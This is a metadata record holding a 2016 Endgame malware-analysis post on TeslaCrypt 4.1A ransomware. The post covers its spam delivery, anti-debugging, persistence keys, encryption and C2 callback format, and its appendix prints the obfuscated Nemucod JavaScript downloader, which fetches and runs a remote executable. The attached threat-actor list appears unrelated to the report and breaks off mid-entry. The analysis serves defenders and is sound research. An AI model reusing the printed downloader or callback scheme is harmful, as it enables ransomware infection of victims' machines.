{
    "id": "7e61cecd-3574-4a91-a851-85543a61cd89",
    "created_at": "2023-01-12T15:09:36.969127Z",
    "updated_at": "2025-03-27T02:05:23.367045Z",
    "deleted_at": null,
    "sha1_hash": "c10eeccdb53e365b49c2802a4d5e8a40f34b3c7e",
    "title": "2016-04-19 - Your Package Has Been Successfully Encrypted- TeslaCrypt 4.1A and the Malware Attack Chain",
    "authors": "",
    "file_creation_date": "2022-05-28T15:26:54Z",
    "file_modification_date": "2022-05-28T15:26:54Z",
    "file_size": 2726193,
    "plain_text": "# Your package has been successfully encrypted: TeslaCrypt 4.1A and the malware attack chain\n\n**[endgame.com/blog/technical-blog/your-package-has-been-successfully-encrypted-teslacrypt-41a-and-malware-attack](https://www.endgame.com/blog/technical-blog/your-package-has-been-successfully-encrypted-teslacrypt-41a-and-malware-attack)**\n\nApril 19, 2016\n\n[19 April 2016Tech Topics](https://www.endgame.com/blog/category/technical-topics)\n\nBy\n[Mark Mager](https://www.endgame.com/blog/author/mark-mager)\nShare\n\n**Editor’s Note: Elastic** [joined forces with Endgame in October 2019, and has migrated some](https://www.elastic.co/blog/introducing-elastic-endpoint-security)\n[of the Endgame blog content to elastic.co. See Elastic Security to learn more about our](https://www.elastic.co/security)\nintegrated security solutions.\n\nRansomware quickly gained national headlines in February after the Hollywood Presbyterian\nMedical Center in Los Angeles paid $17,000 in bitcoins to regain access to its systems. Since\nthen, other hospitals have similarly been attacked with ransomware, leading some industry\nexperts to proclaim it an industry-specific crisis. Although it is commonly associated with\ndirected campaigns aimed at high-value targets such as hospitals, ransomware is actually\nbecoming less targeted and more omnidirectional. As our latest research on TeslaCrypt\ndemonstrates, ransomware not only is becoming more widespread, but it is also becoming\nmore sophisticated and adaptable. TeslaCrypt 4.1A is only a week old and contains an even\n\n\n-----\n\ngreater variety of stealth and obfuscation techniques than its previous variants, the earliest of\nwhich is just over a year old. Organizations and individuals alike must be aware ransomware\nis equally likely to be found in personal networks as in critical infrastructure networks, and that\nits rapid transformation and growing sophistication presents significant challenges to the\nsecurity community and significant threats to users of all kinds.\n\n## History and Current Reality of Ransomware\n\nRansomware has been around for at least a decade, but its evolution and frequency have\nexploded over the last half year. In its early days, ransomware was relatively unsophisticated,\nuncommon, and more targeted. However, ransomware now largely involves code reuse, slight\nmodifications to older families, and a variety of spam campaigns. Capabilities that once were\nthe discrete realm of APTs are now accessible to attackers with fewer resources. TeslaCrypt\n4.1A is indicative of this larger trend, integrating a variety of obfuscation techniques – such as\nAV evasion, anti-debugging, and stealth – into a powerful and rapidly changing piece of\nmalware. Moreover, the incentive structure has shifted. Ransomware aimed at high-value\ntargets depends entirely on getting one fish to bite, and so the ransom value is much higher.\nAs the graphic below illustrates, with the proliferation of ransomware via widespread spam\ncampaigns, attackers can demand smaller sums of money, which can still be extremely\nlucrative because it only requires infiltration of a small percentage of targets.\n\n\n-----\n\n## Campaign Overview\n\nLast week, an Endgame researcher was analyzing spam emails for indications of emergent\nmalicious activity. The researcher came upon an interesting set of emails, which were soon\ndetermined to be part of a widespread spam campaign. The emails all highlighted the\nsuccessful delivery of a package, which can be tracked by simply clicking on a link. This is\nespecially interesting timing. At the peak of procrastinators filing their taxes at the last minute,\nthose who send in their tax forms are exactly the technically less-sophisticated users these\nkinds of campaigns target.\n\nWe rapidly determined that this spam campaign was attempting to broadly deliver TeslaCrypt\n4.1A to individuals. In the subsequent sections, we’ll detail the various stages of the\nTeslaCrypt 4.1A attack chain, moving from infiltration to detection evasion, anti-analysis and\nevasion features, entrenchment, and the malicious mission, concluding with some points on\nthe user experience. This integration of various obfuscation and deception techniques is\nindicative of the larger trend in ransomware toward more sophisticated and multi-faceted\ncapabilities.\n\n\n-----\n\n1. During infiltration, the downloader mechanism is attached as a zipped JavaScript file.\n2. This JavaScript file is a downloader that uses the local environment's Windows Script\n\nHost (WSH) or wscript to download the payload. When the ZIP file is decompressed and\nthe JavaScript file is executed, the WSH will be invoked to execute the code.\n3. The downloader proceeds to download the TeslaCrypt implant via a HTTP GET request\n\nto greetingsyoungqq[.]com/80.exe. This binary will then be launched by the downloader.\n4. To evade debuggers, the binary uses QueryPerformance/GetTickCount evasion\n\ntechnique to check the runtime performance as well as threading.\n5. Next, the binary allocates heap memory to allocate a PE in memory. This PE does the\n\nfollowing:\n\n1. It establishes an inter-process communication channel with the CoInitialize(),\n\nCoCreateInstance()         APIs to communicate through DirectShow in order\nto establish various strings in memory.\n2. Uses QueryPerformance/GetTickCount debugging evasion technique\n3. Uses Wow64DisableWow64FsRedirection to disable file system redirection for the\n\ncalling thread.\n4. Deletes Zone.Identifier ADS after successful execution\n5. Checks token membership for System Authority\n6. Next, the PE drops a copy of itself to the %UserProfile%\\Documents\\[12 random a-z\n\ncharacters].exe, creates a child process, and adds SeDebugPrivilege to the newly\nspawned process while in a separate thread\n\n\n-----\n\n7. Deletes parent binary using %COMSPEC% /C DEL %S\n8. Creates mutex \"__wretw_w4523_345\" for more threading activity and runs a shell\n\ncommand to delete volume shadow copies\n9. It entrenches the binary into the registry via a startup run key\n10. During the encrypting, it generates the public key based on the encrypted private key.\n\n11. The implant begins encrypting all accessible files on the file system based on the file\n\nextensions in the appendix.\n12. Finally, it displays the ransom note in three forms: text, image, and web page. The\n\nbinary will then notify the C2 server of the presence of a new victim.\n\n## Delivery and the Downloader\n\nIn this instance, TeslaCrypt is delivered using a zipped email attachment containing a\nJavaScript downloader:\n\n### Email Spam Attack\n\n Email contents\n```\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"<a\nhref=\"https://www.w3.org/TR/xhtml1/DTD/xhtml1transitional.dtd\">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd</a>\">\n<html xmlns=\"<a\nhref=\"https://www.w3.org/1999/xhtml\">http://www.w3.org/1999/xhtml</a>\"> \n<head> \n<title>RE:</title> \n</head> \n<body> \n<pre style=\"font-style: strong\"> \nYour package has been successfully delivered. The proof of delivery (TRK:299736593) is\nenclosed down below. \n</pre> \n</body> \n</html> \n\n```\n\n-----\n\nThe ZIP attachment will contain one file: transaction_wcVSdU.js. When the ZIP is\ndecompressed and the JavaScript file is executed by the user, the Windows Script Host will\nlaunch and execute the JavaScript. The downloader initiates a HTTP GET request to the\nfollowing URI in order to download the TeslaCrypt payload\n(6bfa1c01c3af6206a189b975178965fe):\n\n[http://greetingsyoungqq[.]com/80.exe:](http://10.10.0.46/about:blank)\n\nAs of 4-14-2016, this URI is inactive.\n\nIf the request is successful, the binary will be written to disk in the current user's %TEMP%\ndirectory and launched by the JavaScript.\n\nThe payload (80.exe) was not being flagged by most popular AV products on the day that we\ndetected the malware, likely due to the obfuscation employed. A few days later, about 40% of\nAV vendors had updated their signatures to catch 80.exe, and a week later, a significant\nmajority of AV vendors will flag this file as malicious. However, this wouldn’t help users who\nwere victimized on the first day.\n\n## TeslaCrypt 4.1A Implant Variant Details\n\nVersion information contained within its metadata helps the implant masquerade itself as an\nofficial Windows system DLL:\n\n\n-----\n\nUpon execution, the implant unpacks itself by allocating and writing a clean PE file to heap\nmemory. The clean PE that is invoked contains the implant’s intended malicious functionality.\n\n## Anti-Analysis and Evasion Features\n\nThis malware exhibits some interesting anti-analysis and evasion features which speak to its\nsophistication level. We will describe some of these below.\n\n### String Obfuscation\n\nIn order to evade detection and hide many of its string extractions, the binary utilizes an interprocess communications channel (COM objects). By using the CoInitialize and\nCoCreateInstance Windows APIs, the implant can control DirectShow via\nSoftware\\Microsoft\\DirectShow\\PushClock using a covert channel, utilizing the quartz\nlibraries.\n\n### Anti-Debugging\n\n\n-----\n\nTeslaCrypt calls its anti-debugging function many times to thwart automated debugging or API\nmonitoring. By using the QueryPerformance / GetTickCount evasion technique, the process\nstores the timer count at the beginning of an operation and then records it at the end of the\noperation. If the malware is being debugged, this time difference will be much more than the\nnormal execution time expected.\n\n\n-----\n\n-----\n\n### Anti-Monitoring\n\nThis TeslaCrypt variant contains a routine designed to terminate five standard Windows\nadministrative / process monitoring applications. The binary enumerates all active processes\nand utilizes GetProcessImageFileName to retrieve the executable filename for each process.\nA process will be terminated if its filename contains any of the following strings:\n\ntaskmgr (Task Manager)\nregedi (Registry Editor)\nprocex (SysInternals Process Explorer)\nmsconfi (System Configuration)\ncmd (Command Shell)\n\n\n-----\n\n### Entrenchment\n\nThe implant drops a copy of itself to disk:\n\n%UserProfile%\\Documents\\[12 random a-z characters].exe\n\nIn order to establish persistence, the implant adds a registry value that points to the dropped\ncopy:\n\n\n-----\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\%s\\ SYSTEM32\\CMD.EXE /C\nSTART %USERPROFILE%\\Documents\\[12 random a-z characters].exe\n\nThe malware also sets the EnableLinkedConnections registry key:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLinkedConnections\n\nBy setting this key (which was also something done by previous versions of TeslaCrypt),\nnetwork drives become available to both regular users and administrators. This will allow the\nimplant to easily access and encrypt files on connected network shares in addition to\nencrypting files on the local hard drive. In a connected business environment, this could\nsubstantially increase the damage done by the tool.\n\n### Malicious Mission\n\nTeslaCrypt relies mostly on scare tactics to corner victims into paying the ransom. In reality,\nit’s making false claims about its encryption usage and has recovery mechanisms that can\nhelp users recover files.\n\n### Encryption\n\nEven though the malware's ransom message claims that the encryption used is RSA-4096,\nthis algorithm is not used in any way. Instead, files are encrypted with AES256 CBC. In the\nencryption function it first generates the various keys which uses standard elliptic curve\nsecp256k1 libraries which is typical for bitcoin related authors. An example of these keys can\nbe seen in memory in the hex view below detailing memory status during master key\ngeneration. Once the keys are generated, they are then saved in\n%USERPROFILE%\\Documents\\desctop._ini and\n%USERPROFILE%\\Documents\\-!recover!-!file!-.txt. If the malware detects that a file named\n\"desctop._ini\" already exists at the specified path, it will not start the key pair generation or\nencrypt any files because it already assumes that the files have already been encrypted.\n\n\n-----\n\nsecp256k1 functions used for master key generation:\n\n### Generated Keys\n\n\n-----\n\nMemory during the Master key generation:\n\n\n-----\n\ndesctop.ini\n\n-!recover!-!file!-.txt\n\n\n-----\n\n### Callback Routine\n\nIf the binary successfully encrypts the targeted files on the host, it spins off a thread and\ninitiates a callback routine that attempts HTTP POST requests to six different URIs:\n```\nloseweightwithmysite[.]com/sys_info.php \nhelcel[.]com/sys_init.php \nthinktrimbebeautiful[.]com[.]au/sys_init.php \nlorangeriedelareine[.]fr/sys_init.php \nbluedreambd[.]com/inifile.php \nonguso[.]com/inifile.php \n\n```\nThe requests are formatted as such:\n```\nPOST <a href=\"about:blank\">http://loseweightwithmysite[.]com/sys_info.php</a> \nUserAgent: Mozilla/5.0 (Windows NT 6.3 rv:11.0) like Gecko \nContent-Type: application/x-www-form-urlencoded \n*/* \ndata=550EF3E0F3BC2E175190FA31F0F440EC9FB7F1AA325D2C42645A173A1C19F6F14E291E1C6F3ADB48CF\n955ECAB1500D8C5F76DC27E141CA5EA1855D71C8CEC592702694AD29E2631BBB6AC79734C569F42897765D9\n\n```\nThe \"data\" POST variable is used to transmit data that is used by the threat actor to track their\nvictims. This data includes host configuration information, version information pertaining to the\nimplant, a randomly generated bitcoin address (where the affected user is instructed to direct\ntheir ransom payment), and key data needed to initiate a recovery of the encrypted files. This\ninformation is placed in a query string format and will be subsequently encrypted and encoded\nprior to transmission in the POST request:\n\n\n-----\n\n```\nSub [Ping: hardcoded callback mode]&dh [combination of public and private key\ndata]&addr=[bitcoin address generated at runtime]&size=0&version=[4.1a: hardcoded\nTeslaCrypt version number]&OS=[OS build number derived from\nVersionInformation.dwBuildNumber]&ID=[821: appears to be a hardcoded value possibly\nused to further identify a particular variant]&inst_id=[user ID generated at runtime] \n\n```\nProvided below is a string with sample data:\n```\nSub=Ping&dh=04803B73A04A81984A83DB117D8D2C46678A5C3B828E55D265B0A4413FC248194F26505A967\nBA5D492B6429112FFC1478F386804A9CF31E38821425545563D7BCB9CC2BD46EA4FCAADD4BF473E6BD&addr\n4.1a&OS=7601&ID=821&inst_id=D19191ED8D504416 \n\n```\nThe query string will then be AES encrypted:\n\nAn ASCII representation of the binary output of the AES encryption will then be written to\nmemory:\n\n\n-----\n\nThis data will then be attached to the \"data\" POST variable and transmitted in the request.\n\nIf the implant successfully issues a POST request and receives a valid response from the\ncallback server, the thread will terminate. The thread will also terminate if it does not receive a\nvalid response after attempting one request to each of the callback servers.\n\nAside from the \"Ping\" mode (designated in the Sub query string variable), the binary also\nreferences a separate \"Crypted\" callback mode, though this mode does not appear to be\naccessible in this particular variant.\n\n### User Experience\n\nThe ransom information is displayed using 3 methods:\n\nHTML page\ntext file\nPNG image\n\nThese files will also be written to disk in nearly every directory on the file system. The links\nfor a real victim’s will reference the victim’s unique ID which facilitates payment tracking and\ndecryption should the ransom be paid.\n\n\n-----\n\nHTML (-!RecOveR!-xdyxv++.Htm)\n\n\n-----\n\nTXT (-!RecOveR!-xdyxv++.Txt)\n\n\n-----\n\nPNG (-!RecOveR!-xdyxv++.Png)\n\n## Conclusion\n\nTeslaCrypt 4.1A is indicative of the broader trend we’re seeing in ransomware. While the\ntargeted, high-value targets dominate the press, ransomware is increasingly opportunistic as\nopposed to targeted. These randomized spam campaigns rely on infiltrating a very small\npercentage of targets, but are still extremely lucrative given their widespread dispersion. In\naddition, the shortened time-frame between variants also reflects the trends in ransomware\nover the last 6-12 months. The speed to update between variants is shrinking, while the\n\n\n-----\n\nsophistication is increasing. This makes reverse engineering the malware more onerous,\nincluding the use of deception techniques such as misleading researchers that RSA-4096\nencryption is used when in reality it was AES-256. In short, not only does the spam campaign\nattempt to deceive potential targets, but TeslaCrypt 4.1A also aims to mislead and stay ahead\nof researchers attempting to reverse engineer it. Only four months into 2016, as our timeline\ndemonstrates, this may very well be the year of the ransomware attack. These kinds of\nopportunistic attacks can be very lucrative and sophisticated, and should increasingly be on\nthe radar of both high-value organizations as well as individuals.\n\n**Appendix**\n\n**Email Header (Email originally forwarded from [redacted].org**\n\n\n-----\n\n```\nDelivered To: [redacted]@gmail.com \nReceived: by [redacted] with SMTP id t129csp1570097vkf; \n    Mon, 11 Apr 2016 10:49:37 -0700 (PDT) \nX-Received: by [redacted] with SMTP id g19mr11538193ote.175.1460396977496; \n    Mon, 11 Apr 2016 10:49:37 -0700 (PDT) \nReturn-Path: <HallimondRandy164@zhongda89.com> \nReceived: from mail-oi0-f50.google.com (mail-oi0-f50.google.com. ) \n    by mx.google.com with ESMTPS id 9si7641149ott.222.2016.04.11.10.49.37 \n    for <[redacted]@gmail.com> \n    (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128); \n    Mon, 11 Apr 2016 10:49:37 -0700 (PDT) \nReceived-SPF: softfail (google.com: domain of transitioning\nHallimondRandy164@zhongda89.com does not designate [redacted] as permitted sender)\nclient-ip=[redacted]; \nAuthentication-Results: mx.google.com; \n   spf=softfail (google.com: domain of transitioning\nHallimondRandy164@zhongda89.com does not designate [redacted] as permitted sender)\nsmtp.mailfrom=HallimondRandy164@zhongda89.com \nReceived: by mail-oi0-f50.google.com with SMTP id y204so196057727oie.3 \n    for <[redacted]@gmail.com>; Mon, 11 Apr 2016 10:49:37 -0700 (PDT) \nX-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; \n    d=1e100.net; s=20130820; \n    h=x-original-authentication-results:x-gm-message-state:message-id \n    :from:to:subject:date:reply-to:mime-version; \n    bh=+IHT+KX3SwGYMwaiqhwtBParNXFx58iS7BjXXX3f3hg=; \n    b=aF7RbWAEZMTRaddOFbhKFi9ghacPytB5mK2/YwImzNr2GFAvOyVR6yfsOEk8B3XdKZ \n    Oc1kESzLaBtRB2PBS5Se66Utxg4a6TBNAWQanuxMthDFUERgQgaA+xae+7uiKLMYrnJC \n    rmdIqEuNJ31hq6EaBBHdSwmtBfSfR4q9s4uOZWCuPI+iIzGAW8aUOHxWVDiZDXJCJOA2 \n    D8AHo5/yUmosn0zFHUo6nThJF5KQKzgPPaYka9avNhFFXUYwXp9RjUKGN+2MDmoOYnWC \n    YoYgxZs275cd7cI1hH27ESf60U8aSvjnhh6q5oTTZgfSdekFAhA+MyY7onvGomj4kzAZ \n    ju1A== \nX-Original-Authentication-Results: gmr-mx.google.com;    spf=softfail (google.com:\ndomain of transitioning HallimondRandy164@zhongda89.com does not designate [redacted]\nas permitted sender) smtp.mailfrom=HallimondRandy164@zhongda89.com \nX-Gm-Message-State:\nAOPr4FUtA2HQqGRu+GdZuu8wADNknK4b73v+HF33ILQuYoMSQUrg45myopzxVcSix38piF2Nek5YQwvPOL2fGuT\nX-Received: by [redacted] with SMTP id 10mr7798207otm.47.1460396976918; \n    Mon, 11 Apr 2016 10:49:36 -0700 (PDT) \nReturn-Path: <HallimondRandy164@zhongda89.com> \nReceived: from dsl-187-156-10-25-dyn.prod-infinitum.com.mx () \n    by gmr-mx.google.com with ESMTP id y20si1822157pfa.2.2016.04.11.10.49.36\n    for <[redacted]@gmail.com>; \n    Mon, 11 Apr 2016 10:49:36 -0700 (PDT) \nReceived-SPF: softfail (google.com: domain of transitioning\nHallimondRandy164@zhongda89.com does not designate [redacted] as permitted sender)\nclient-ip=[redacted]; \nMessage-ID: <[redacted]@[redacted].org> \nFrom: =?UTF-8?B?UmFuZHkgSGFsbGltb25k?= <HallimondRandy164@zhongda89.com> \nTo: =?UTF-8?B?a2ZkaG5l?= <[redacted]@[redacted].org> \nSubject: =?UTF-8?B?UkU6?= \nDate: Mon, 11 Apr 2016 12:49:34 -0500 \nReply-To: =?UTF-8?B?a2ZkaG5l?= <[redacted]@[redacted].org> \nMIME-Version: 1.0 \n\n```\n\n-----\n\n**JavaScript downloader (Nemucod) 0eec3406dfb374a7df4c2bb856db1625 Contents:**\n\n\n-----\n\n```\nvar fuXYgBL WS ; \neval(function(p,a,c,k,e,d){e=function(c){return c};if(!\"\".replace(/^/,String))\n{while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function()\n{return\"\\\\w+\"};c=1};while(c--){if(k[c]){p=p.replace(new\nRegExp(\"\\\\b\"+e(c)+\"\\\\b\",\"g\"),k[c])}}return p}(\"0 1=2;\",3,3,\n(\"var|XqTfkKcqqex|\"+fuXYgBL+\"cript\").split(\"|\"),0,{})) \nfunction zrISJA(jjcxUlc) { \nreturn \"hrsaSzYzlaFzEc\"; \n}\nfunction NZwY(FmoOw,RNqcI) { \nvar FiPpmI=[\"ohRoOlCB\",\"\\x77\"+\"\\x72\\x69\",\"\\x74\\x65\"];FmoOw[FiPpmI[1]+FiPpmI[2]](RNqcI)\n}\nfunction jEiG(EJmRb) { \nvar fVxQNBM=[\"\\x6F\\x70\"+\"\\x65\\x6E\"];EJmRb[fVxQNBM[421-421]](); \n}\nfunction wYGJ(HhQGZ,cpllk,bDxjN) { \npHah=HhQGZ; \n//QVWzPmJWZVSK \npHah.open(bDxjN,cpllk,false); \n}\nfunction yrlc(ikMyP) { \nif (ikMyP == 1077-877){return true;} else {return false;} \n}\nfunction Sgix(UFQtP) { \nif (UFQtP > 155282-909){return true;} else {return false;} \n}\nfunction tMlUn(cpqParen,kwDT) { \nreturn \"\"; \n}\nfunction UAUJ(jNuMk) { \nvar nLaSHyDA=[\"\\x73\\x65\"+\"\\x6E\\x64\"]; \njNuMk[nLaSHyDA[0]](); \n}\nfunction uOFx(JEEUB) { \nreturn JEEUB.status; \n}\nfunction eBRRZTo(higo,fYcgC) { \nozMRhEh=[]; \nozMRhEh.push(higo.ExpandEnvironmentStrings(fYcgC)); \nreturn ozMRhEh[0]; \n}\nfunction iIeFEEW(eArZ) { \nvar buDOHaq=(\"\\x72\\x65\\x73\\x70\\x6F\\x6E*\\x73\\x65\\x42\\x6F\\x64\\x79\").split(\"*\"); \nreturn eArZ[buDOHaq[0]+buDOHaq[1]]; \n}\nfunction Ybru(IUgdY,FzFmU) { \nvar usIIR=(\"\\x54\\x6F\\x46*\\x69\\x6C\\x65*\\x73\\x61*\\x76\\x65\").split(\"*\"); \nvar gqfLYpEf=usIIR[344-344]; \nvar FAebRf=usIIR[987-985]+usIIR[309-306]+gqfLYpEf+usIIR[522-521]; \nvar jnEpuJY=[FAebRf];IUgdY[jnEpuJY[788-788]](FzFmU,609-607); \n}\nfunction LZZFymKZ(IfJ) { \nreturn IfJ.size; \n}\nfunction NpkPo(KefYQK) { \nvar WEgJ=[\"\\x70\\x6F\\x73\\x69\\x74\\x69\\x6F\\x6E\"]; \n\n```\n\n-----\n\n```\nreturn KefYQK[WEgJ[904 904]] 114 114; \n}\nfunction MnruB(qpl,HKtRA) { \nvar nweM=[\"\\x73\\x70\\x6C\\x69\\x74\"]; \nreturn qpl[nweM[0]](HKtRA); \n}\nfunction FZyc(WHpHj) { \neTtPIgs=XqTfkKcqqex.CreateObject(WHpHj); \nreturn eTtPIgs; \n}\nfunction HrwpH(bNbUPp) { \nvar nviK=bNbUPp; \nreturn new ActiveXObject(nviK); \n}\nfunction OixB(ocfZi) { \nvar DYsBj=\"\"; \nT=(159-159); \ndo { \nif (T >= ocfZi.length) {break;} \nif (T % (686-684) != (803-803)) { \nvar WyZLN = ocfZi.substring(T, T+(620-619)); \nDYsBj += WyZLN; \n}\nT++; \n} while(true); \nreturn DYsBj; \n}\nvar dx=\"N?B f?z k?V pgWrmeYeAtJiInNgSsbyQojuVnZgNqvqs.7c1oGmb/18s05GQdMXYDc?r\nEgAoyo4gUlee1.Ycgommq/b8l0XGPdqXkDk?3 S?\"; \nvar HC = OixB(dx).split(\" \"); \nvar uzOjdW = \". BrlWfZ e LgzYusBg xe GdXD\".split(\" \"); \nvar t = [HC[0].replace(new RegExp(uzOjdW[5],'g'),\nuzOjdW[0]+uzOjdW[2]+uzOjdW[4]),HC[1].replace(new RegExp(uzOjdW[5],'g'),\nuzOjdW[0]+uzOjdW[2]+uzOjdW[4]),HC[2].replace(new RegExp(uzOjdW[5],'g'),\nuzOjdW[0]+uzOjdW[2]+uzOjdW[4]),HC[3].replace(new RegExp(uzOjdW[5],'g'),\nuzOjdW[0]+uzOjdW[2]+uzOjdW[4]),HC[4].replace(new RegExp(uzOjdW[5],'g'),\nuzOjdW[0]+uzOjdW[2]+uzOjdW[4])]; \nvar vvT = wYUkzixLb(\"hytd\"); \nvar iWO = HrwpH(OXbXCAjC(\"LVLuz\")); \nvar ZeDUTR = (\"CWszPMX \\\\\").split(\" \"); \nvar Klbb = vvT+ZeDUTR[0]+ZeDUTR[1]; \nlSfnmZ(iWO,Klbb); \nvar xSD = (\"2.XMLHTTP BeScUOk kmeQd XML ream St ZFRDIeEL AD aLEesOX O nFcW D\").split(\"\n\"); \nvar ZL = true, JYcj = xSD[7] + xSD[9] + xSD[11]; \nvar uo = FZyc(\"MS\"+xSD[3]+(65368, xSD[0])); \nvar Qie = FZyc(JYcj + \"B.\" + xSD[5]+(877821, xSD[4])); \nvar bfO = 0; \nvar Z = 1; \nvar LaxMJRW = 570182; \nvar n=bfO; \nwhile (true) { \nif(n>=t.length) {break;} \nvar sp = 0; \nvar Ijm = (\"ht\" + \" VMOmvKy tp zoysd bcAmbjuL :/\"+\"/ mxykXfd .e EfmSc x nWCKLh e G\nnWQWoZV E BulesSto T TRoA\").split(\" \"); \n\n```\n\n-----\n\n```\ntry { \nvar LReHyZt=Ijm[134-129]; \nvar xGARQ=Ijm[801-801]+Ijm[473-471]+LReHyZt; \nwYGJ(uo,xGARQ+t[n]+Z, Ijm[12]+Ijm[14]+Ijm[16]); UAUJ(uo); \nif (yrlc(uOFx(uo))) {   \njEiG(Qie); Qie.type = 1; NZwY(Qie,iIeFEEW(uo)); if (Sgix(LZZFymKZ(Qie))) { \nAQVoAgj=/*nrRH29YFVZ*/Klbb/*oVch38RB07*/+LaxMJRW+Ijm[926-919]+Ijm[407-398]+Ijm[742731]; \nsp = 545-544;NpkPo(Qie);Ybru(Qie,AQVoAgj); \nif (293>50) { \ntry {pGMyLfHuk(Klbb+LaxMJRW+Ijm[682-675]+Ijm[590-581]+Ijm[781-770]); \n}\ncatch (gl) { \n}; \nbreak; \n}\n}; Qie.close(); \n}; \nif (sp == 1) { \nbfO = n; break; \n}; \n}\ncatch (gl) { \n}; \nn++; \n}; \nfunction lSfnmZ(vRNP,BFDQSl) { \ntry {vRNP.CreateFolder(BFDQSl);}catch(yMBcZQ){}; \n}\nfunction pGMyLfHuk(sjrheBIoAMu) { \nvar FTcKLVxo =\nMnruB(\"sqjR=Ws=SYmMxdi=c=LkNYHr=ri\"+\"=pt=PAiRubzP=.S=ZWNin=he=QKIpiY=l\"+\"l=zZtYtCg\"+\"=Y\n \"=\"); \nvar zfRKdfpc = FZyc(FTcKLVxo[271-270] + FTcKLVxo[136-133] + FTcKLVxo[214-209] +\nFTcKLVxo[977-971] + FTcKLVxo[641-633] + FTcKLVxo[928-918]+FTcKLVxo[368-356]); \njxjZabos(zfRKdfpc,sjrheBIoAMu); \n}\nfunction/*OAJC*/jxjZabos(TRAYg,GOyvuX) { \nvar RtpGce= (\"JSaOOwisDoL;\\x72;\\x75;\\x6E;JgVDLJItskks\").split(\";\"); \nvar xFr=RtpGce[992-991]+RtpGce[563-561]+RtpGce[696-693]; \nvar VeXb=/*vyYh*/[xFr]; \n//rATi \nTRAYg[VeXb[251-251]](GOyvuX); \n}\nfunction wYUkzixLb(rjwBK) { \nvar kuglrOp = \"njDqTN*KHD*pt.S\"+\"he\"+\"ll*PzPJjXp*Sc\"+\"ri*\"; \nvar kuMsE = MnruB(kuglrOp+\"CLPW*%T\"+\"E*MP%*\\\\*yIkarFYNo*nEyAhd*RsGedfF*apQUP\", \"*\"); \nvar TbT=((117-116)?\"W\" + kuMsE[428-424]:\"\")+kuMsE[110-108]; \nvar tn = FZyc(TbT); \nSvDMQR=kuMsE[255-249]+kuMsE[302-295]; \nreturn eBRRZTo(tn,SvDMQR+kuMsE[855-847]); \n}\nfunction OXbXCAjC(OceU) { \nvar ziaeORqzQs = \"Sc WGsgmuy r NzOtRcclv ipt\"+\"ing HjDZRDm uMM ile ybhLPUOzWBGhng\"; \nvar fzryoIu = MnruB(ziaeORqzQs+\" \"+\"Sys\"+\"tem Bm hmjQH Obj vQPPEr ect fokQapQ ACJDF\",\n\" \"); \n\n```\n\n-----\n\n```\nreturn fzryoIu[0] fzryoIu[2] fzryoIu[4] .F  fzryoIu[7] fzryoIu[9] \nfzryoIu[12] + fzryoIu[14]; \n}\n\n```\n**We're hiring**\n\nWork for a global, distributed team where finding someone like you is just a Zoom\nmeeting away. Flexible work with impact? Development opportunities from the start?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-04-19 - Your Package Has Been Successfully Encrypted- TeslaCrypt 4.1A and the Malware Attack Chain.pdf"
    ],
    "report_names": [
        "2016-04-19 - Your Package Has Been Successfully Encrypted- TeslaCrypt 4.1A and the Malware Attack Chain.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
